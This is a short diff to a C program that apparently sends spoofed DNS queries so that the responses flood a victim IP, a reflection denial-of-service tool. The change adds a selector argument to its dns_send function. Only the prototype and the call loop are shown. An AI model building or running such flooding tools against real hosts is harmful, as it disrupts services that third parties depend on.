@@ -4,7 +4,7 @@
 #include <sys/time.h>
 #include <time.h>
 
-int dns_send(char *victim_ip,int udp_src_port,char *dns_ip,int dns_port);
+int dns_send(char *victim_ip,int udp_src_port,char *dns_ip,int dns_port,int select);
 int main(int argc, char **argv){	
 	// Initial uid check and argument count check
 	if(argc != 4){
@@ -20,7 +20,7 @@ int main(int argc, char **argv){
 	int udp_src_p = atoi(argv[2]);
 	int i;
 	for(i = 1;i <= 3;i++){
-		if(dns_send(victim_ip,udp_src_p,dns_server, 53) == -1){
+		if(dns_send(victim_ip,udp_src_p,dns_server,53,i - 1) == -1){
 			printf("[x] Get error in dns_send()\n");
 			exit(-1);
 		}
